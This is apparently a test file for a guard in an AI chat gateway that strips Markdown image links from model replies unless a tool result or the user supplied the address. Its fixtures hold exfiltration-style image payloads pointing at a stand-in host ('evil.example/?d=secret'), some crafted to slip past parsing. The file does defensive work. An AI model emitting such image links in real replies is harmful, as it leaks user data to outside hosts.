import { describe, expect, it } from 'vitest';

import { ReplyFetchGuard } from '../src/gateway/reply-fetch-guard.js';
import type { ChatMessage } from '../src/types/api.js';
import type { ToolExecution } from '../src/types/execution.js';

const CDN = 'https://cdn.example.com/p/1.jpg';
const EVIL = 'https://evil.example/?d=secret';

function execution(result: string, args = '{}'): ToolExecution {
  return { name: 'shop_search', arguments: args, result, durationMs: 1 };
}

function guard(
  messages: ChatMessage[] = [],
  executions: ToolExecution[] = [],
): ReplyFetchGuard {
  const created = new ReplyFetchGuard(
    [{ role: 'system', content: `system prompt ${EVIL}` }, ...messages],
    () => {},
  );
  created.finish(executions);
  return created;
}

function streamed(
  text: string,
  messages: ChatMessage[],
  executions: ToolExecution[],
  chunk = 1,
): string {
  let out = '';
  const created = new ReplyFetchGuard(messages, (delta) => {
    out += delta;
  });
  for (let index = 0; index < text.length; index += chunk)
    created.push(text.slice(index, index + chunk));
  created.finish(executions);
  return out;
}

// Every picture a renderer could fetch from the text, read loosely.
function pictureTargets(text: string): string[] {
  return [...text.matchAll(/!\[[^\]]*\]\(\s*<?([^\s)>]*)/g)].map(
    (match) => match[1],
  );
}

describe('pictures', () => {
  it.each([
    ['a tool result', [], [execution(`{"image":"${CDN}"}`)]],
    ['a JSON-escaped tool result', [], [execution(CDN.replaceAll('/', '\\/'))]],
    ['a sentence in a tool result', [], [execution(`Bild: ${CDN}.`)]],
    ['a user message', [{ role: 'user', content: `look ${CDN}` }], []],
    [
      'an earlier tool result',
      [{ role: 'tool', content: `[img](${CDN})`, tool_call_id: 'c1' }],
      [],
    ],
  ] as const)('shows a picture whose address came from %s', (_, messages, executions) => {
    const reply = `Here:\n\n![Shower gel](${CDN})\n`;
    expect(
      guard(messages as ChatMessage[], executions as ToolExecution[]).rewrite(
        reply,
      ),
    ).toBe(reply);
  });

  it.each([
    ['nothing vouched for it', `![Shower gel](${EVIL})`, 'Shower gel'],
    ['it has a title', `![Shower gel](${CDN} "title")`, 'Shower gel'],
    ['it is a prefix of a seen address', `![x](${CDN.slice(0, -4)})`, 'x'],
    ['it has no description', `a ![](${EVIL}) b`, 'a   b'],
    [
      'its description holds code',
      `![a\`](${CDN})\`](${EVIL})`,
      'a`\`](https://evil.example/?d=secret)',
    ],
  ])('describes a picture when %s', (_, reply, expected) => {
    expect(guard([], [execution(CDN)]).rewrite(reply)).toBe(expected);
  });

  it('reads HTML and JSON escapes in a tool result once', () => {
    const query = 'https://cdn.example.com/i?a=1&b=2';
    const html = guard([], [execution('<img src="https://cdn.example.com/i?a=1&amp;b=2">')]);
    expect(html.rewrite(`![x](${query})`)).toBe(`![x](${query})`);
    // `&amp;lt;` reads as `&lt;`, never as `<`.
    const twice = guard([], [execution('https://cdn.example.com/i?q=&amp;lt;')]);
    expect(twice.rewrite('![x](https://cdn.example.com/i?q=&lt;)')).toBe(
      '![x](https://cdn.example.com/i?q=&lt;)',
    );
    expect(twice.rewrite('![x](https://cdn.example.com/i?q=<)')).toBe('x');
  });

  it('keeps workspace pictures, which no client fetches from the web', () => {
    const reply = '![chart](sandbox:/workspace/out/chart.png)';
    expect(guard().rewrite(reply)).toBe(reply);
  });

  it('does not trust an address the model wrote before a tool echoed it', () => {
    const echoed = [execution(`fetched ${EVIL}`, JSON.stringify({ url: EVIL }))];
    expect(guard([], echoed).rewrite(`![x](${EVIL})`)).toBe('x');

    const history: ChatMessage[] = [
      {
        role: 'assistant',
        content: '',
        tool_calls: [
          {
            id: 'c1',
            type: 'function',
            function: { name: 'web_fetch', arguments: `{"q":"evil.example/?d=secret"}` },
          },
        ],
      },
      { role: 'tool', content: `result ${EVIL}`, tool_call_id: 'c1' },
    ];
    expect(guard(history).rewrite(`![x](${EVIL})`)).toBe('x');
  });

  it('does not trust delegate results, which are model writing', () => {
    const results = `[Delegate results]\nsee ${EVIL}`;
    expect(
      guard([{ role: 'user', content: results }]).rewrite(`![x](${EVIL})`),
    ).toBe('x');
  });

  it.each([
    ['reference style', '![x][r]\n\n[r]: https://evil.example/a'],
    ['too long', `![x](${EVIL}${'a'.repeat(5000)})`],
    ['unclosed', `![x](${EVIL}`],
    ['nested', `![a ![b](x[) ](${EVIL})`],
    ['adjacent to a removed one', `!![](${EVIL})[z](${EVIL})`],
    ['completed by a removed one', `![x]![(${EVIL})](${EVIL})`],
    ['split around a description', `![a!](${EVIL})[z](${EVIL})`],
    ['inside a description', `![[z]](${EVIL})(${EVIL})`],
  ])('leaves no fetchable picture when %s', (_, reply) => {
    const out = guard([], [execution(CDN)]).rewrite(reply);
    for (const target of pictureTargets(out)) expect(target).toBe(CDN);
  });
});

describe('links on a line of their own', () => {
  it.each([
    [
      'joins the line before',
      `Found it:\n\n${EVIL}\nMore.`,
      `Found it: ${EVIL}\nMore.`,
    ],
    [
      'joins a Markdown link',
      `Found it:\n- [Page](${EVIL})`,
      `Found it: - [Page](${EVIL})`,
    ],
    ['names the host on a first line', `${EVIL}\nMore.`, `${EVIL} (evil.example)\nMore.`],
    ['keeps a vouched link', `Found it:\n${CDN}`, `Found it:\n${CDN}`],
    ['keeps a link in a sentence', `Found it:\nSee ${EVIL}`, `Found it:\nSee ${EVIL}`],
    ['keeps a picture line', `Hi\n![x](${CDN})`, `Hi\n![x](${CDN})`],
  ])('%s', (_, reply, expected) => {
    expect(guard([], [execution(CDN)]).rewrite(reply)).toBe(expected);
  });
});

describe('streaming', () => {
  const executions = [execution(`{"image":"${CDN}"}`)];
  it.each([
    `Here:\n\n![Shower gel](${CDN})\nfor 1,95 €!`,
    `Nope ![x](${EVIL}) and ![y](${CDN}) done!`,
    `Found it:\n\n${EVIL}\n- [Page](${CDN})\nhttps://cdn.example.com/p\n`,
    `!![](${EVIL})[z](${EVIL}) ![a ![b](x[) ](${EVIL}) ![x][r] ![open](${CDN}`,
    `${EVIL}`,
    'h\nht\nhttps://evil.example\n',
  ])('streams the start of the stored reply: %s', (reply) => {
    const stored = guard([], executions).rewrite(reply);
    for (const chunk of [1, 3, 7, reply.length]) {
      expect(streamed(reply, [], executions, chunk)).toBe(stored);
    }
  });

  it('streams a picture once a full-argument call returned it', () => {
    const out: string[] = [];
    const created = new ReplyFetchGuard([], (delta) => out.push(delta));
    created.noteToolProgress({
      sessionId: 's',
      toolName: 'shop_search',
      phase: 'start',
      preview: '{"q":"gel"}',
    });
    created.noteToolProgress({
      sessionId: 's',
      toolName: 'shop_search',
      phase: 'finish',
      preview: `{"image":"${CDN}"}`,
    });
    created.push(`Look ![gel](${CDN}) here`);
    expect(out.join('')).toBe(`Look ![gel](${CDN}) here`);
  });

  it('holds a picture until the turn ends when a call hid its arguments', () => {
    const out: string[] = [];
    const created = new ReplyFetchGuard([], (delta) => out.push(delta));
    created.noteToolProgress({
      sessionId: 's',
      toolName: 'bash',
      phase: 'start',
      preview: 'Running a shell command',
    });
    created.noteToolProgress({
      sessionId: 's',
      toolName: 'bash',
      phase: 'finish',
      preview: CDN,
    });
    created.push(`Look ![gel](${CDN}) here`);
    expect(out.join('')).toBe('Look ');
    created.finish([execution(CDN)]);
    expect(out.join('')).toBe(`Look ![gel](${CDN}) here`);
  });

  it('settles the text written before a tool call', () => {
    const out: string[] = [];
    const created = new ReplyFetchGuard([], (delta) => out.push(delta));
    created.push(`Wait ![x](${EVIL}) ok`);
    created.noteToolProgress({
      sessionId: 's',
      toolName: 'shop_search',
      phase: 'start',
      preview: '{}',
    });
    expect(out.join('')).toBe('Wait x ok');
  });
});
